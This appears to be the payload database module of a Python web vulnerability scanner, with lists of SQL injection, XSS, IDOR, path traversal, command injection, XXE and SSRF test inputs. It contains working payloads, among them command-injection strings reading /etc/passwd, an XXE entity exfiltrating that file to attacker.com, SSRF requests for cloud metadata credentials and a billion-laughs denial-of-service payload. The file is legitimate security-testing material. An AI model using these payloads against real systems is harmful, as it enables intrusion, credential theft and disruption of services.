"""
Payload database for SPECTR vulnerability scanner
"""

class PayloadDatabase:
    """Database of payloads for different vulnerability types"""
    
    def __init__(self):
        self.payloads = {
            'sqli': self._get_sqli_payloads(),
            'xss': self._get_xss_payloads(),
            'idor': self._get_idor_payloads(),
            'traversal': self._get_traversal_payloads(),
            'command_injection': self._get_command_injection_payloads(),
            'xxe': self._get_xxe_payloads(),
            'ssrf': self._get_ssrf_payloads(),
        }
    
    def get_payloads(self, vuln_type):
        """Get payloads for a specific vulnerability type"""
        return self.payloads.get(vuln_type, [])
    
    def _get_sqli_payloads(self):
        """SQL injection payloads"""
        return [
            # Error-based payloads
            "'",
            "\"",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR (1=1)--",
            
            # Union-based payloads
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION SELECT null,null,null--",
            
            # Boolean-based payloads
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            
            # Time-based payloads
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "'; SELECT pg_sleep(5)--",
            
            # Numeric payloads
            "1 OR 1=1",
            "1 OR 1=2",
            "1' OR '1'='1",
            "1' OR '1'='2",
            
            # Common bypass attempts
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 ORDER BY 1--",
            "'/**/OR/**/1=1--",
            "' OR 1=1%00",
            "' OR 1=1\x00",
        ]
    
    def _get_xss_payloads(self):
        """Cross-site scripting payloads"""
        return [
            # Basic XSS payloads
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert('SPECTR')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            
            # Event-based XSS
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            
            # JavaScript protocol
            "javascript:alert('XSS')",
            "javascript:alert(1)",
            "javascript:confirm('XSS')",
            
            # Advanced XSS
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            
            # Filter bypass attempts
            "<Script>alert('XSS')</Script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            
            # Encoded payloads
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # CSS-based XSS
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            
            # HTML5 XSS
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ]
    
    def _get_idor_payloads(self):
        """Insecure Direct Object Reference payloads"""
        return [
            # Numeric increments/decrements
            "1", "2", "3", "4", "5", "10", "100", "1000",
            "-1", "-2", "-3", "0",
            
            # Common user IDs
            "admin", "administrator", "root", "user", "test",
            "demo", "guest", "public", "anonymous",
            
            # UUID-like patterns
            "00000000-0000-0000-0000-000000000001",
            "11111111-1111-1111-1111-111111111111",
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
            
            # Path-based IDOR
            "../", "../../", "../../../",
            "..", "..%2F", "..%5c",
            
            # File-based IDOR
            "config.php", "config.json", "settings.ini",
            "users.txt", "passwords.txt", "database.sql",
            
            # Session/token manipulation
            "ABC123", "123ABC", "TOKEN123", "SESSION123",
            
            # Special characters
            "*", "%", "null", "undefined", "NaN",
            
            # Boolean values
            "true", "false", "1", "0", "yes", "no",
        ]
    
    def _get_traversal_payloads(self):
        """Path traversal payloads"""
        return [
            # Basic traversal
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../",
            "../../../../../../",
            "../../../../../../../",
            "../../../../../../../../",
            
            # URL encoded
            "%2e%2e%2f",
            "%2e%2e%5c",
            "%2e%2e/",
            "..%2f",
            "..%5c",
            "%2e%2e%2f%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            
            # Double URL encoded
            "%252e%252e%252f",
            "%252e%252e%255c",
            
            # Mixed encoding
            "..%252f",
            "..%c0%af",
            "..%c1%9c",
            
            # Null byte injection
            "../%00",
            "../../%00",
            "../../../%00",
            
            # Windows-specific
            "..\\",
            "..\\..\\",
            "..\\..\\..\\",
            "..\\..\\..\\..\\",
            
            # Common file targets
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../etc/hosts",
            "../etc/group",
            
            # Windows targets
            "..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\windows\\system32\\config\\sam",
            "..\\windows\\win.ini",
            "..\\windows\\system.ini",
            
            # Application-specific
            "../config/database.yml",
            "../config/config.php",
            "../wp-config.php",
            "../.env",
            "../.htaccess",
            "../web.config",
            
            # Filter bypass
            "....//",
            "....\\\\",
            "..../",
            "....\\",
            "....//....//",
            "....\\\\....\\\\",
        ]
    
    def _get_command_injection_payloads(self):
        """Command injection payloads"""
        return [
            # Unix/Linux commands
            "; id",
            "; whoami",
            "; pwd",
            "; ls -la",
            "; ps aux",
            "; uname -a",
            "; cat /etc/passwd",
            "; cat /etc/hosts",
            "; which python",
            "; which curl",
            
            # Windows commands
            "; dir",
            "; ver",
            "; whoami",
            "; ipconfig",
            "; systeminfo",
            "; tasklist",
            "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
            
            # Command separators
            " | id",
            " | whoami",
            " | dir",
            " & id",
            " & whoami",
            " & dir",
            " && id",
            " && whoami",
            " && dir",
            " || id",
            " || whoami",
            " || dir",
            
            # Command substitution
            "`id`",
            "`whoami`",
            "$(id)",
            "$(whoami)",
            "$(pwd)",
            
            # Newline injection
            "\nid",
            "\nwhoami",
            "\ndir",
            "\r\nid",
            "\r\nwhoami",
            "\r\ndir",
            
            # URL encoded
            "%3Bid",
            "%3Bwhoami",
            "%26id",
            "%26whoami",
            "%7Cid",
            "%7Cwhoami",
            
            # Time-based
            "; sleep 5",
            " | sleep 5",
            " & sleep 5",
            " && sleep 5",
            "; ping -c 5 127.0.0.1",
            " | ping -c 5 127.0.0.1",
            "`sleep 5`",
            "$(sleep 5)",
            
            # Windows time-based
            "; timeout 5",
            " | timeout 5",
            " & timeout 5",
            " && timeout 5",
            "; ping -n 5 127.0.0.1",
            " | ping -n 5 127.0.0.1",
            
            # Special cases
            "; id #",
            "; whoami #",
            "; dir #",
            "| id",
            "| whoami",
            "| dir",
            "& id",
            "& whoami",
            "& dir",
        ]
    
    def _get_xxe_payloads(self):
        """XXE (XML External Entity) payloads"""
        return [
            # Basic XXE - Unix/Linux files
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/group"> ]>
<foo>&xxe;</foo>''',
            
            # Windows files
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system.ini"> ]>
<foo>&xxe;</foo>''',
            
            # HTTP XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/xxe"> ]>
<foo>&xxe;</foo>''',
            
            # Parameter entity XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
<foo>test</foo>''',
            
            # Nested entity XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
    %eval;
    %exfil;
]>
<foo>test</foo>''',
            
            # Different protocols
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/version"> ]>
<foo>&xxe;</foo>''',
            
            # Expect header XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<foo>&xxe;</foo>''',
            
            # PHP wrapper
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"> ]>
<foo>&xxe;</foo>''',
            
            # Data protocol
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ="> ]>
<foo>&xxe;</foo>''',
            
            # Billion Laughs (DoS)
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<foo>&lol5;</foo>''',
        ]
    
    def _get_ssrf_payloads(self):
        """SSRF (Server-Side Request Forgery) payloads"""
        return [
            # Local loopback
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://0000:0000:0000:0000:0000:0000:0000:0001/",
            
            # Private IP ranges
            "http://192.168.1.1/",
            "http://192.168.0.1/",
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://172.31.0.1/",
            
            # Different ports
            "http://127.0.0.1:80/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8000/",
            "http://127.0.0.1:3000/",
            "http://127.0.0.1:5000/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:21/",
            "http://127.0.0.1:3306/",
            "http://127.0.0.1:5432/",
            "http://127.0.0.1:6379/",
            "http://127.0.0.1:27017/",
            "http://127.0.0.1:9200/",
            
            # Different protocols
            "ftp://127.0.0.1/",
            "sftp://127.0.0.1/",
            "ssh://127.0.0.1/",
            "telnet://127.0.0.1/",
            "ldap://127.0.0.1/",
            "redis://127.0.0.1/",
            "mysql://127.0.0.1/",
            "postgresql://127.0.0.1/",
            "mongodb://127.0.0.1/",
            
            # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/instance-type",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            
            # Google Cloud metadata
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            
            # Azure metadata
            "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
            "http://169.254.169.254/metadata/instance/compute?api-version=2017-08-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            
            # URL encoding bypass
            "http://127.0.0.1/",
            "http://0x7f.0x0.0x0.0x1/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "http://017700000001/",
            "http://0x7f000001/",
            
            # IPv6 bypass
            "http://[::ffff:127.0.0.1]/",
            "http://[0:0:0:0:0:ffff:127.0.0.1]/",
            "http://[::ffff:7f00:1]/",
            
            # Domain bypass
            "http://localtest.me/",
            "http://127.0.0.1.xip.io/",
            "http://127.0.0.1.nip.io/",
            "http://127.0.0.1.sslip.io/",
            
            # Out-of-band testing
            "http://ssrf.burpcollaborator.net/",
            "http://httpbin.org/get",
            "http://postman-echo.com/get",
            "http://requestbin.fullcontact.com/",
            "http://webhook.site/unique-id",
        ]